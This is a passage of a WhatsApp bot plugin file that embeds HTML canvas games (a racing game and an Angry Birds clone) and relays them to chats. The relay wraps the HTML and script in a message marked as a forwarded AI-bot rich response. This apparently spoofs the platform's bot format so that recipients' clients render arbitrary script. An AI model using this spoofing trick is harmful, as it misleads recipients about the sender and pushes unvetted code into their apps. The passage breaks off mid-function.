    ctx.beginPath();ctx.arc(-w*0.48,-h*0.18,Math.max(1.5,w*0.052),0,TAU);ctx.fill();
    ctx.beginPath();ctx.arc(w*0.48,-h*0.18,Math.max(1.5,w*0.052),0,TAU);ctx.fill();
    ctx.fillStyle=isPlayer?'#ffd23f':'#e63946';
    ctx.beginPath();ctx.arc(-w*0.48,-h*0.18,Math.max(1,w*0.016),0,TAU);ctx.fill();
    ctx.beginPath();ctx.arc(w*0.48,-h*0.18,Math.max(1,w*0.016),0,TAU);ctx.fill();
 
    ctx.fillStyle=carbon;
    rrect(-w*0.48,-h*0.26,w*0.96,Math.max(2,h*0.12),2);ctx.fill();
    ctx.fillStyle=dark;
    for(var df=-0.30;df<=0.31;df+=0.20){
        ctx.fillRect(w*df-Math.max(1,w*0.01),-h*0.26,Math.max(1.5,w*0.018),h*0.13);
    }
 
    var strobe=brake||(Math.floor(gt*14)%2===0);
    ctx.fillStyle=strobe?'#ff2010':'rgba(70,10,10,0.7)';
    rrect(-w*0.035,-h*0.22,Math.max(3,w*0.07),Math.max(2,h*0.06),1);ctx.fill();
    if(brake&&w>30){
        ctx.fillStyle='rgba(255,40,20,0.35)';
        ctx.beginPath();ctx.arc(0,-h*0.19,w*0.07,0,TAU);ctx.fill();
    }
 
    for(var ex of [-0.20,0.20]){
        ctx.fillStyle=rgbS(mixc([130,140,155],FOGC,fog));
        ctx.beginPath();ctx.arc(w*ex,-h*0.18,Math.max(1.8,w*0.046),0,TAU);ctx.fill();
        ctx.fillStyle='#0c0f16';
        ctx.beginPath();ctx.arc(w*ex,-h*0.18,Math.max(1.2,w*0.032),0,TAU);ctx.fill();
    }
 
    if(nit){
        for(var ep of [-w*0.20,w*0.20]){
            ctx.fillStyle='rgba(0,210,255,0.45)';
            ctx.beginPath();ctx.arc(ep,-h*0.18,w*0.13,0,TAU);ctx.fill();
 
            var fl=(1.5+Math.random()*0.9)*w*0.38;
            ctx.fillStyle='#00d9ff';
            ctx.beginPath();
            ctx.moveTo(ep-w*0.07,-h*0.18);
            ctx.lineTo(ep,-h*0.18+fl);
            ctx.lineTo(ep+w*0.07,-h*0.18);
            ctx.closePath();ctx.fill();
 
            var fl2=fl*0.72;
            ctx.fillStyle='#ff8a20';
            ctx.beginPath();
            ctx.moveTo(ep-w*0.05,-h*0.18);
            ctx.lineTo(ep,-h*0.18+fl2);
            ctx.lineTo(ep+w*0.05,-h*0.18);
            ctx.closePath();ctx.fill();
 
            var fl3=fl*0.42;
            ctx.fillStyle='#ffffff';
            ctx.beginPath();
            ctx.moveTo(ep-w*0.03,-h*0.18);
            ctx.lineTo(ep,-h*0.18+fl3);
            ctx.lineTo(ep+w*0.03,-h*0.18);
            ctx.closePath();ctx.fill();
        }
    }
 
    ctx.fillStyle=bodyDark;
    rrect(-w*0.48,-h*0.40,w*0.96,h*0.20,Math.max(2,w*0.04));ctx.fill();
    ctx.fillStyle=bodyCol;
    rrect(-w*0.50,-h*0.62,w*1.0,h*0.36,Math.max(3,w*0.07));ctx.fill();
    ctx.fillStyle=bodyLight;
    rrect(-w*0.46,-h*0.62,w*0.92,Math.max(1,h*0.04),1);ctx.fill();
 
    if(w>40){
        ctx.fillStyle=dark;
        ctx.fillRect(-w*0.46,-h*0.48,w*0.03,h*0.12);
        ctx.fillRect(w*0.43,-h*0.48,w*0.03,h*0.12);
    }
 
    ctx.fillStyle=bodyDark;
    ctx.beginPath();
    ctx.moveTo(-w*0.35,-h*0.62);
    ctx.lineTo(-w*0.27,-h*1.02);
    ctx.lineTo(w*0.27,-h*1.02);
    ctx.lineTo(w*0.35,-h*0.62);
    ctx.closePath();ctx.fill();
 
    ctx.fillStyle=rgbS(mixc([28,45,68],FOGC,fog));
    ctx.beginPath();
    ctx.moveTo(-w*0.25,-h*0.65);
    ctx.lineTo(-w*0.20,-h*0.97);
    ctx.lineTo(w*0.20,-h*0.97);
    ctx.lineTo(w*0.25,-h*0.65);
    ctx.closePath();ctx.fill();
 
    if(w>45){
        ctx.strokeStyle=rgbS(mixc([140,150,165],FOGC,fog*0.8));
        ctx.lineWidth=Math.max(1,w*0.015);
        ctx.beginPath();
        ctx.moveTo(-w*0.18,-h*0.94);ctx.lineTo(w*0.18,-h*0.68);
        ctx.moveTo(w*0.18,-h*0.94);ctx.lineTo(-w*0.18,-h*0.68);
        ctx.stroke();
    }
 
    if(w>35){
        ctx.fillStyle='rgba(255,255,255,0.18)';
        ctx.beginPath();
        ctx.moveTo(-w*0.15,-h*0.66);
        ctx.lineTo(-w*0.08,-h*0.96);
        ctx.lineTo(-w*0.02,-h*0.96);
        ctx.lineTo(-w*0.09,-h*0.66);
        ctx.closePath();ctx.fill();
    }
 
    var stripeCol=(col[0]>185&&col[1]>185)?'rgba(26,30,38,0.85)':'rgba(255,255,255,0.85)';
    ctx.fillStyle=stripeCol;
    var stW=Math.max(1.2,w*0.038);
    var stG=Math.max(1,w*0.018);
    ctx.fillRect(-stG-stW,-h*1.02,stW,h*0.74);
    ctx.fillRect(stG,-h*1.02,stW,h*0.74);
 
    if(w>36){
        var nStr=String(num||(isPlayer?77:1));
        ctx.fillStyle='rgba(250,250,252,0.92)';
        ctx.beginPath();ctx.arc(0,-h*0.48,Math.max(4,w*0.075),0,TAU);ctx.fill();
        ctx.strokeStyle='rgba(20,24,32,0.7)';ctx.lineWidth=Math.max(0.8,w*0.012);ctx.stroke();
        txt(nStr,0,-h*0.48,Math.max(5,w*0.08),'#111827',null,0);
    }
 
    ctx.fillStyle=carbon;
    ctx.fillRect(-Math.max(1,w*0.012),-h*1.06,Math.max(1.8,w*0.024),h*0.44);
 
    ctx.fillStyle=dark;
    ctx.fillRect(-w*0.31,-h*1.12,Math.max(1.8,w*0.032),h*0.26);
    ctx.fillRect(w*0.278,-h*1.12,Math.max(1.8,w*0.032),h*0.26);
    ctx.fillStyle=carbon;
    rrect(-w*0.52,-h*1.14,w*1.04,Math.max(3,h*0.08),2);ctx.fill();
    ctx.fillStyle='rgba(255,255,255,0.30)';
    ctx.fillRect(-w*0.50,-h*1.14,w*1.0,Math.max(1,h*0.02));
    ctx.fillStyle=bodyCol;
    rrect(-w*0.535,-h*1.18,Math.max(2,w*0.028),Math.max(5,h*0.15),1);ctx.fill();
    rrect(w*0.507,-h*1.18,Math.max(2,w*0.028),Math.max(5,h*0.15),1);ctx.fill();
 
    if(brake){
        ctx.fillStyle='rgba(255,30,20,0.38)';
        ctx.beginPath();ctx.ellipse(0,-h*0.45,w*0.48,h*0.15,0,0,TAU);ctx.fill();
        ctx.fillStyle='#ff2010';
        rrect(-w*0.45,-h*0.48,w*0.90,Math.max(3,h*0.085),2);ctx.fill();
        ctx.fillStyle='#fff5f0';
        rrect(-w*0.42,-h*0.46,w*0.84,Math.max(1.5,h*0.038),1);ctx.fill();
        ctx.fillStyle='#ff2010';
        rrect(-w*0.14,-h*1.06,w*0.28,Math.max(2,h*0.035),1);ctx.fill();
    }else{
        ctx.fillStyle=rgbS(mixc([210,25,25],FOGC,fog*0.5));
        rrect(-w*0.45,-h*0.47,w*0.90,Math.max(2,h*0.065),2);ctx.fill();
        ctx.fillStyle='#ff3b3b';
        rrect(-w*0.42,-h*0.46,w*0.84,Math.max(1,h*0.028),1);ctx.fill();
    }
 
    ctx.restore();
}
 
function renderSprites(){
    var carsBy={};
    for(var i=0;i<cars.length;i++){
        var c=cars[i];
        var si=segIdxAt(c.z);
        if(!carsBy[si])carsBy[si]=[];
        carsBy[si].push(c);
    }
    for(var n=fs.length-1;n>=0;n--){
        var e=fs[n];
        if(e.d1<=camDepth)continue;
        ctx.save();
        ctx.beginPath();
        ctx.rect(0,0,W,Math.max(e.clip,1));
        ctx.clip();
        if(e.idx===0){
            var gTitle=(lap>LAPS)?'FINISH':((state==='count'||(lap===1&&position<3500))?'START / FINISH':(lap===LAPS?'FINAL LAP':'FINISH'));
            drawGantry(e,gTitle);
        }
        else if(e.idx===Math.floor(segments.length*0.33))drawGantry(e,'SECTOR 2');
        else if(e.idx===Math.floor(segments.length*0.66))drawGantry(e,'SECTOR 3');
        var sg=signsBy[e.idx];
        if(sg)drawSign(e,sg);
        var tl=treesBy[e.idx];
        if(tl)for(var t=0;t<tl.length;t++){
            var tr=tl[t];
            drawTree(e.x1+tr.off*e.w1,e.y1,
                e.w1*0.16*tr.sc,e.fog,tr.type);
        }
        var cl=carsBy[e.idx];
        if(cl){
            if(cl.length>1){
                cl.sort(function(a,b){
                    var da=shortestDz(a.z,position);
                    var db=shortestDz(b.z,position);
                    return db-da;
                });
            }
            for(var k=0;k<cl.length;k++){
                var car=cl[k];
                var tt=(car.z%SEG)/SEG;
                var sx=lerp(e.x1,e.x2,tt)+car.x*lerp(e.w1,e.w2,tt);
                var sy=lerp(e.y1,e.y2,tt);
                var cw=lerp(e.w1,e.w2,tt)*0.36;
                if(cw>3){
                    drawCar(sx,sy,cw,car.col,car.brake,car.nitro,car.steer||0,e.fog,false,car.num);
                    if(car.nitro&&cw>14&&Math.random()<0.65){
                        for(var ep of [-cw*0.20,cw*0.20]){
                            particles.push({
                                x:sx+ep+rnd(-cw*0.04,cw*0.04),
                                y:sy+rnd(cw*0.01,cw*0.06),
                                vx:rnd(-25,25),
                                vy:rnd(40,140)*(cw/70),
                                g:60,
                                size:rnd(1.5,3.2)*(cw/50),
                                life:0.45,
                                decay:rnd(2.5,4),
                                color:Math.random()<0.5?'#00f0ff':(Math.random()<0.8?'#ff9a3d':'#ffffff')
                            });
                        }
                    }
                }
            }
        }
        ctx.restore();
    }
}
 
function drawPlayer(){
    var pw=clamp(W*0.34,115,165);
    var steer=(steerR?1:0)-(steerL?1:0);
    var spdPct=clamp(speed/maxSpeed,0,1.2);
    var bounce=Math.abs(playerX)>0.96?
        Math.sin(gt*40)*4*spdPct:Math.sin(gt*7)*1.2*spdPct;
    var sway=steer*28;
    drawCar(W/2+sway,H*0.875+bounce,pw,PLAYER_COL,
        brakeHeld,nitroOn,steer,0,true,77);
}
 
function drawParticles(){
    for(var i=0;i<particles.length;i++){
        var p=particles[i];
        ctx.globalAlpha=clamp(p.life,0,1)*0.9;
        ctx.fillStyle=p.color;
        ctx.beginPath();
        ctx.arc(p.x,p.y,p.size*(0.4+0.6*clamp(p.life,0,1)),0,TAU);
        ctx.fill();
    }
    ctx.globalAlpha=1;
}
 
function drawSpeedLines(){
    var isNit=nitroOn&&speed>maxSpeed*0.7;
    var pct=clamp((speed-maxSpeed*0.5)/(maxSpeed*0.5),0,1);
    if(pct<=0.02&&!isNit)return;
 
    if(isNit){
        var grad=ctx.createRadialGradient(W/2,H*0.48,W*0.3,W/2,H*0.48,W*0.8);
        grad.addColorStop(0,'rgba(0,210,255,0)');
        grad.addColorStop(0.7,'rgba(0,180,255,0.06)');
        grad.addColorStop(1,'rgba(0,140,255,0.24)');
        ctx.fillStyle=grad;
        ctx.fillRect(0,0,W,H);
    }
 
    var lines=isNit?24:14;
    var baseAlpha=isNit?0.42:(pct*0.22);
    for(var i=0;i<lines;i++){
        var a=(i/lines)*TAU+Math.sin(gt*14+i)*0.08;
        var r0=Math.min(W,H)*(isNit?0.32:0.42);
        var r1=r0+(isNit?rnd(70,160):(35+pct*65));
        var col=isNit?(i%3===0?'#00f0ff':(i%3===1?'#ffffff':'#ffd23f')):'#ffffff';
        ctx.strokeStyle=col;
        ctx.globalAlpha=baseAlpha*(0.5+Math.random()*0.5);
        ctx.lineWidth=isNit?rnd(2,3.5):2;
        ctx.beginPath();
        ctx.moveTo(W/2+Math.cos(a)*r0,H*0.46+Math.sin(a)*r0*0.75);
        ctx.lineTo(W/2+Math.cos(a)*r1,H*0.46+Math.sin(a)*r1*0.75);
        ctx.stroke();
    }
    ctx.globalAlpha=1;
}
 
function drawSpeedo(){
    var cx=W-54,cy=H-54,R=42;
    var pct=clamp(speed/(maxSpeed*1.70),0,1);
    ctx.fillStyle='rgba(10,18,30,0.85)';
    ctx.beginPath();ctx.arc(cx,cy,R+8,0,TAU);ctx.fill();
    ctx.strokeStyle=nitroOn?'#00f0ff':'#ffd23f';
    ctx.lineWidth=nitroOn?2.5:2;
    ctx.beginPath();ctx.arc(cx,cy,R+8,0,TAU);ctx.stroke();
    var a0=PI*0.75,a1=PI*2.25;
    ctx.lineWidth=7;
    ctx.strokeStyle='rgba(255,255,255,0.14)';
    ctx.beginPath();ctx.arc(cx,cy,R-4,a0,a1);ctx.stroke();
    var gaugeCol=nitroOn?'#00f0ff':(pct>0.75?'#e8402f':(pct>0.5?'#ffd23f':'#7ce87c'));
    ctx.strokeStyle=gaugeCol;
    ctx.beginPath();ctx.arc(cx,cy,R-4,a0,a0+(a1-a0)*pct);ctx.stroke();
    ctx.strokeStyle='rgba(255,255,255,0.5)';
    ctx.lineWidth=2;
    for(var i=0;i<=8;i++){
        var a=a0+(a1-a0)*i/8;
        ctx.beginPath();
        ctx.moveTo(cx+Math.cos(a)*(R-9),cy+Math.sin(a)*(R-9));
        ctx.lineTo(cx+Math.cos(a)*(R-3),cy+Math.sin(a)*(R-3));
        ctx.stroke();
    }
    var na=a0+(a1-a0)*pct;
    ctx.strokeStyle=nitroOn?'#00f0ff':'#fff';
    ctx.lineWidth=3;
    ctx.beginPath();
    ctx.moveTo(cx,cy);
    ctx.lineTo(cx+Math.cos(na)*(R-8),cy+Math.sin(na)*(R-8));
    ctx.stroke();
    ctx.fillStyle='#cfd6dd';
    ctx.beginPath();ctx.arc(cx,cy,4,0,TAU);ctx.fill();
    var kmh=Math.round(speed/100);
    txt(String(kmh),cx,cy+16,15,nitroOn?'#00f0ff':'#fff','#1a2a50',3);
    txt('km/j',cx,cy+27,7,nitroOn?'#90e0ef':'#9db8dd',null,0);
}
function drawHUD(){
    if(state==='menu')return;
    pillL('⏱ '+fmtT(raceT),12,18,10,'#ffd23f',6);
    if(bestLap)
        pillL('BEST LAP '+fmtT(bestLap),12,38,8,'#9cdcff',5);
    if(slipping&&state==='race'){
        var pa=0.6+0.4*Math.sin(gt*8);
        ctx.globalAlpha=pa;
        pillL('💨 SLIPSTREAM!',12,58,9,'#9cdcff',5);
        ctx.globalAlpha=1;
    }
    if(nitroOn&&state==='race'){
        var na=0.7+0.3*Math.sin(gt*14);
        ctx.globalAlpha=na;
        pill('⚡ NITRO BOOST! ⚡',W/2,66,11,'#00f0ff',6);
        ctx.globalAlpha=1;
    }
    if(otPop){
        ctx.globalAlpha=clamp(1.3-otPop.t,0,1);
        pill(otPop.txt,W/2,44,11,otPop.color,6);
        ctx.globalAlpha=1;
    }
    var curSeg=segments[segIdxAt(position)];
    var aheadSeg=segments[segIdxAt(position+2600)];
    if(state==='race'&&speed>maxSpeed*0.46){
        if(Math.abs(curSeg.curve)>2.8){
            var cvSign=curSeg.curve>0?'⚠️ REM! TIKUNGAN KANAN TAJAM ⚠️':'⚠️ REM! TIKUNGAN KIRI TAJAM ⚠️';
            var warnAlpha=0.75+0.25*Math.sin(gt*16);
            ctx.globalAlpha=warnAlpha;
            pill(cvSign,W/2,90,10,'#ff4747',6);
            ctx.globalAlpha=1;
        }else if(Math.abs(aheadSeg.curve)>4.2){
            var aheadSign=aheadSeg.curve>0?'⚠️ SIAPKAN REM! TIKUNGAN KANAN ⚠️':'⚠️ SIAPKAN REM! TIKUNGAN KIRI ⚠️';
            var warnAlpha2=0.70+0.30*Math.sin(gt*12);
            ctx.globalAlpha=warnAlpha2;
            pill(aheadSign,W/2,90,9.5,'#ffb703',5);
            ctx.globalAlpha=1;
        }
    }
    if(state==='race'&&Math.abs(playerX)>1.0&&speed>maxSpeed*0.15){
        var offAlpha=0.75+0.25*Math.sin(gt*18);
        ctx.globalAlpha=offAlpha;
        var dirHelp=playerX>0?'◀ SETIR KIRI KE JALUR!':'SETIR KANAN KE JALUR! ▶';
        pill('⚠️ KELUAR LINTASAN! '+dirHelp,W/2,114,9.5,'#ff3b3b',6);
        ctx.globalAlpha=1;
    }
    var pw=W*0.5,px0=(W-pw)/2;
    ctx.fillStyle='rgba(255,255,255,0.18)';
    rrect(px0,H-10,pw,5,2);ctx.fill();
    ctx.fillStyle='#ffd23f';
    rrect(px0,H-10,Math.max(4,pw*frac(position/trackLen)),5,2);ctx.fill();
    var nx=14,ny=H-84,nh=64;
    ctx.fillStyle='rgba(10,18,30,0.82)';
    rrect(nx-5,ny-nh,16,nh,8);ctx.fill();
    ctx.strokeStyle=nitroOn?'#00f0ff':'rgba(255,210,63,0.8)';
    ctx.lineWidth=nitroOn?2.5:1.5;
    rrect(nx-5,ny-nh,16,nh,8);ctx.stroke();
    var fh=nh*clamp(nitro,0,1);
    if(fh>2){
        ctx.fillStyle=nitroOn?'#00f0ff':'#ffd23f';
        rrect(nx-2,ny-fh,10,fh,5);ctx.fill();
    }
    txt(nitroOn?'⚡':'🔥',nx+3,ny-nh-12,12,nitroOn?'#00f0ff':'#ffd23f',null,0);
}
function drawBannerC(){
    if(!banner)return;
    var p=banner.t/banner.dur;
    var s=p<0.15?1+((0.15-p)/0.15)*0.6:(p>0.8?1-((p-0.8)/0.2)*0.15:1);
    var alpha=p>0.7?1-((p-0.7)/0.3):1;
    var bs=Math.min(banner.size,W*0.14);
    ctx.save();
    ctx.translate(W/2,H*0.36);
    ctx.scale(Math.max(0.01,s),Math.max(0.01,s));
    ctx.globalAlpha=clamp(alpha,0,1);
    txt(banner.text,0,0,bs,banner.color,'#1a2a50',bs*0.22);
    if(banner.sub)txt(banner.sub,0,bs*0.62,12,'#fff','#1a2a50',4);
    ctx.restore();
    ctx.globalAlpha=1;
}
function drawCountdown(){
    if(state!=='count'||cd>3)return;
    var n=Math.max(1,Math.ceil(cd));
    var f=frac(cd);
    var s=1.12+(1-f)*0.38;
    var col=n===3?'#ff4757':(n===2?'#ffa502':'#2ed573');
    var shadow=n===3?'#6b111a':(n===2?'#6e3b00':'#0c421e');
    ctx.save();
    ctx.translate(W/2,H*0.38);
    ctx.scale(s,s);
    ctx.globalAlpha=clamp(0.45+f*0.55,0,1);
    txt(String(n),0,0,92,col,shadow,16);
    ctx.restore();
    ctx.globalAlpha=1;
}
function drawMenu(){
    var pw=Math.min(W*0.9,340);
    var ph=H*0.22;
    var px0=(W-pw)/2,py0=H*0.08;
    ctx.fillStyle='rgba(8,14,24,0.85)';
    rrect(px0,py0,pw,ph,18);ctx.fill();
    ctx.strokeStyle='#ffd23f';
    ctx.lineWidth=2.5;
    rrect(px0,py0,pw,ph,18);ctx.stroke();
    var ls=Math.min(36,W*0.095);
    txt('TURBO RACE',W/2,py0+ph*0.26,ls,'#ffd23f','#7a3b12',ls*0.22);
    txt('3D — SIRKUIT 3 LAP',W/2,py0+ph*0.52,ls*0.42,'#9cdcff','#123a6a',ls*0.14);
    var pa=0.55+0.45*Math.sin(gt*3.2);
    txt('TAP MULAI UNTUK BALAP!',W/2,py0+ph*0.82,Math.min(14,W*0.04),
        'rgba(255,255,255,'+pa.toFixed(3)+')','#1a2a50',4);
    pill('⛽ Gas otomatis • ◀▶ setir • 🛑 rem • 🔥 nitro',
        W/2,py0+ph+20,9,'#eaf2ff',5);
    if(bestLap)
        pill('🏆 Rekor lap: '+fmtT(bestLap),
            W/2,py0+ph+42,10,'#ffd23f',6);
    pill('💨 Nempel belakang lawan = slipstream!',
        W/2,py0+ph+64,9,'#9cdcff',5);
}
 
function draw(){
    if(W<10||H<10)return;
    ctx.setTransform(dpr,0,0,dpr,0,0);
    ctx.clearRect(0,0,W,H);
    ctx.save();
    if(shakeT>0){
        var pw=shakeT*10;
        ctx.translate((Math.random()-0.5)*pw,(Math.random()-0.5)*pw);
    }
    drawSky();
    renderRoad();
    renderSprites();
    if(state!=='menu')drawPlayer();
    drawParticles();
    drawSpeedLines();
    ctx.restore();
    drawHUD();
    drawBannerC();
    drawCountdown();
    if(state==='menu')drawMenu();
}
 
function bindHold(el,set){
    el.addEventListener('pointerdown',function(e){
        e.preventDefault();
        e.stopPropagation();
        AU.resume();
        set(true);
        el.classList.add('held');
        try{el.setPointerCapture(e.pointerId);}catch(err){}
    });
    function off(){
        set(false);
        el.classList.remove('held');
    }
    el.addEventListener('pointerup',off);
    el.addEventListener('pointercancel',off);
    el.addEventListener('lostpointercapture',off);
    el.addEventListener('pointerleave',off);
    el.addEventListener('click',function(e){e.preventDefault();});
    el.addEventListener('contextmenu',function(e){e.preventDefault();});
}
bindHold(btnL,function(v){steerL=v;});
bindHold(btnR,function(v){steerR=v;});
bindHold(brakeBtn,function(v){brakeHeld=v;});
bindHold(nitroBtn,function(v){nitroHeld=v;});
 
muteBtn.addEventListener('pointerdown',function(e){
    e.preventDefault();
    e.stopPropagation();
    AU.resume();
    var mu=AU.toggle();
    muteBtn.textContent=mu?'🔇':'🔊';
});
muteBtn.addEventListener('click',function(e){e.preventDefault();});
muteBtn.addEventListener('contextmenu',function(e){e.preventDefault();});
 
canvas.addEventListener('pointerdown',function(e){
    e.preventDefault();
    AU.resume();
    if(state==='menu')startRace();
});
 
window.addEventListener('keydown',function(e){
    AU.resume();
    var k=e.key.toLowerCase();
    if(k==='enter'){
        if(!e.repeat){
            if(state==='menu'||state==='finished')startRace();
        }
        e.preventDefault();return;
    }
    if(k==='arrowleft'||k==='a')steerL=true;
    else if(k==='arrowright'||k==='d')steerR=true;
    else if(k==='arrowdown'||k==='s')brakeHeld=true;
    else if(k===' '||k==='n')nitroHeld=true;
    else if(k==='m'&&!e.repeat){
        var mu=AU.toggle();
        muteBtn.textContent=mu?'🔇':'🔊';
    }
    if(k.indexOf('arrow')===0||k===' ')e.preventDefault();
});
window.addEventListener('keyup',function(e){
    var k=e.key.toLowerCase();
    if(k==='arrowleft'||k==='a')steerL=false;
    else if(k==='arrowright'||k==='d')steerR=false;
    else if(k==='arrowdown'||k==='s')brakeHeld=false;
    else if(k===' '||k==='n')nitroHeld=false;
});
 
againBtn.addEventListener('click',function(){
    AU.resume();
    over.classList.add('hidden');
    startRace();
});
menuBtn.addEventListener('click',function(){
    AU.resume();
    toMenu();
});
document.addEventListener('contextmenu',function(e){e.preventDefault();});
 
function loop(now){
    requestAnimationFrame(loop);
    var dt=(now-last)/1000;
    if(!(dt>0)||dt>0.05)dt=0.016;
    last=now;
    gt+=dt;
    if(!errMsg){
        try{update(dt);}
        catch(e){errMsg=String(e&&e.message||e);}
    }
    if(!errMsg){
        try{draw();}
        catch(e){errMsg=String(e&&e.message||e);}
    }
}
 
try{
    resize();
    buildTrack();
    initCars();
    position=0;
    AU.setMusicVol(0.45);
    last=performance.now();
    requestAnimationFrame(loop);
}catch(e){
    errMsg=String(e&&e.message||e);
    try{
        ctx.setTransform(1,0,0,1,0,0);
        ctx.fillStyle='rgba(40,0,0,0.92)';
        ctx.fillRect(0,0,canvas.width,canvas.height);
        ctx.fillStyle='#ffdddd';
        ctx.font='13px monospace';
        ctx.textAlign='left';
        ctx.fillText('INIT ERROR: '+errMsg.substr(0,50),10,20);
    }catch(e2){}
}
 
})();
</script>
 
</body>
</html>`;


const data = {
  response_id: "PopiooNixelPopiooNixelPopiooNixel",
  sections: [
    {
      __typename: "GenAIUnifiedResponseSection",
      view_model: {
        __typename: "GenAISingleLayoutViewModel",
        primitive: {
          __typename: "GenAIBotProgressStatusPrimitive",
          title: "KLIK TEKS INI",
          is_in_progress: true
        }
      }
    }
  ],
  embedded_screens: [
    {
      title: "Preview",
      content: [
        {
          __typename: "FOAIDNixelButtonSheets",
          tabs: [
            {
              id: "tab_0",
              tab_header: "Luna-MD",
              sections: [
                {
                  __typename: "GenAIUnifiedResponseSection",
                  view_model: {
                    __typename: "GenAISingleLayoutViewModel",
                    primitive: {
                      __typename: "GenAIaeacdsnwHtmlPrimitive",
                      payload: html,
                      url: "https://example.com",
                      trusted_sources: ["example.com"]
                    }
                  }
                }
              ],
              step_entries: []
            }
          ]
        }
      ]
    }
  ]
};

await luna.relayMessage(
  m.chat,
  {
    messageContextInfo: {
      deviceListMetadata: {},
      deviceListMetadataVersion: 2,
      botMetadata: {
        messageDisclaimerText: "",
        richResponseSourcesMetadata: {}
      }
    },
    botForwardedMessage: {
      message: {
        richResponseMessage: {
          messageType: 1,
          unifiedResponse: {
            data: Buffer.from(JSON.stringify(data)).toString('base64')
          },
          contextInfo: {
            forwardingScore: 1,
            isForwarded: true,
            forwardedAiBotMessageInfo: { botJid: "0@bot" },
            forwardOrigin: 4
          }
        }
      }
    }
  },
  {
    messageId: await luna.generateMessageTag()
  }
)
}
break

case "angrybirds":
case "angribet": { 
const html = `
<style>
:root{
  --ink:#e9edef;
  --ink-soft:#aebac1;
  --muted:#8696a0;
  --accent:#00a884;
  --line:#2a3942;
  --line-strong:#374248;
  --cell-bg:#111b21;
  --card-2:#2a3942;
  --sys:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,Helvetica,Arial,sans-serif;
}
*{margin:0;padding:0;box-sizing:border-box;-webkit-tap-highlight-color:transparent;}
html,body{background:transparent;color:var(--ink);font-family:var(--sys);min-height:100vh;overflow-x:hidden;-webkit-font-smoothing:antialiased;}
.stage{min-height:100vh;display:flex;flex-direction:column;align-items:center;justify-content:center;padding:24px 16px;}
.card{width:100%;max-width:380px;}
.header{display:flex;align-items:baseline;justify-content:space-between;margin-bottom:14px;padding-bottom:12px;border-bottom:1px solid var(--line);gap:8px;}
.header__title{font-size:17px;font-weight:600;color:var(--ink);}
.header__sub{font-size:12px;color:var(--muted);}
.status{display:flex;align-items:center;justify-content:space-between;margin-bottom:14px;font-size:13px;gap:8px;}
.status__score{display:flex;gap:16px;color:var(--muted);font-size:12px;}
.status__score b{color:var(--ink);}
.board-wrap{position:relative;width:100%;aspect-ratio:16/10;background:#87CEEB;border-radius:8px;overflow:hidden;border:1px solid var(--line);}
canvas{width:100%;height:100%;display:block;cursor:crosshair;touch-action:none;}
.controls{margin-top:12px;display:flex;gap:8px;flex-wrap:wrap;justify-content:center;}
.controls button{border:none;border-radius:10px;padding:10px 16px;font-size:13px;font-weight:700;color:#0b141a;cursor:pointer;font-family:inherit;background:var(--card-2);color:var(--ink);border:1px solid var(--line);}
.controls button:active{filter:brightness(.85);transform:scale(0.95);}
.btn-shoot{background:linear-gradient(180deg,#e74c3c,#c0392b);color:#fff !important;}
.btn-reset{background:var(--accent);color:#0b141a !important;border-color:var(--accent) !important;}
.btn-power{background:linear-gradient(180deg,#f39c12,#d68910);color:#fff !important;}
</style>

<main class="stage">
<div class="card">
<div class="header">
<div class="header__title">🐦 Angry Birds</div>
<div class="header__sub">tembak babi!</div>
</div>
<div class="status">
<div class="status__score">
<span>Skor <b id="score-display">0</b></span>
<span>Burung <b id="birds-display">5</b></span>
<span>Target <b id="targets-display">0</b></span>
</div>
</div>
<div class="board-wrap">
<canvas id="board"></canvas>
</div>
<div class="controls">
<button class="btn-shoot" id="btn-shoot">🎯 Tembak</button>
<button class="btn-power" id="btn-power">⚡ Power +10</button>
<button class="btn-reset" id="btn-reset">🔄 Ulang</button>
</div>
</div>
</main>

<script>
const canvas=document.getElementById('board');
const ctx=canvas.getContext('2d');
let W=400,H=250;

function resizeCanvas(){
const rect=canvas.getBoundingClientRect();
W=canvas.width=Math.max(320,Math.floor(rect.width));
H=canvas.height=Math.max(200,Math.floor(rect.height));
}

let birds=[],targets=[],projectiles=[],score=0,birdCount=5,level=1,gameOver=false;
let power=50,maxPower=100,charging=false,chargeTimer=null;
let birdX=60,birdY=0,groundY=0;
let dragStart=null,dragEnd=null,isDragging=false;
let particles=[],explosions=[];

function resetGame(){
birds=[];targets=[];projectiles=[];particles=[];explosions=[];
score=0;birdCount=5;level=1;gameOver=false;power=50;
groundY=H*0.82;
birdX=60;
birdY=groundY-20;
spawnTargets();
updateUI();
}

function spawnTargets(){
const count=3+level;
targets=[];
for(let i=0;i<count;i++){
const x=W*0.5+40+Math.random()*(W*0.35);
const y=groundY-20-Math.random()*(H*0.35);
const size=16+Math.random()*8;
targets.push({
x:x,y:y,w:size,h:size,
hp:1+Math.floor(level/2),
maxHp:1+Math.floor(level/2),
alive:true,
type:Math.random()>0.7?'pig':'block'
});
}
document.getElementById('targets-display').textContent=targets.filter(t=>t.alive).length;
}

function updateUI(){
document.getElementById('score-display').textContent=score;
document.getElementById('birds-display').textContent=birdCount;
document.getElementById('targets-display').textContent=targets.filter(t=>t.alive).length;
}

function shoot(){
if(gameOver)return;
if(birdCount<=0){gameOver=true;return;}
if(projectiles.length>0)return;

const angle=-45+Math.random()*30;
const powerFactor=power/50;
const vx=Math.cos(angle*Math.PI/180)*powerFactor*4;
const vy=-Math.sin(angle*Math.PI/180)*powerFactor*4-2;

projectiles.push({
x:birdX+20,y:birdY-10,
vx:vx,vy:vy,
r:10,
life:true,
gravity:0.3
});

birdCount--;
updateUI();
}

function shootWithPower(pwr){
if(gameOver)return;
if(birdCount<=0){gameOver=true;return;}
if(projectiles.length>0)return;

const angle=-40+Math.random()*20;
const powerFactor=pwr/50;
const vx=Math.cos(angle*Math.PI/180)*powerFactor*5;
const vy=-Math.sin(angle*Math.PI/180)*powerFactor*5-3;

projectiles.push({
x:birdX+20,y:birdY-10,
vx:vx,vy:vy,
r:10,
life:true,
gravity:0.3
});

birdCount--;
updateUI();
}

function addExplosion(x,y,color,count){
for(let i=0;i<count;i++){
const angle=Math.random()*Math.PI*2;
const speed=1+Math.random()*4;
particles.push({
x:x,y:y,
vx:Math.cos(angle)*speed,
vy:Math.sin(angle)*speed-1,
life:30+Math.random()*30,
maxLife:60,
r:2+Math.random()*4,
color:color
});
}
}

function update(){
if(gameOver)return;

for(let i=projectiles.length-1;i>=0;i--){
const p=projectiles[i];
p.x+=p.vx;
p.y+=p.vy;
p.vy+=p.gravity;

if(p.y+p.r>groundY){
p.y=groundY-p.r;
p.vx*=0.8;
p.vy*=-0.3;
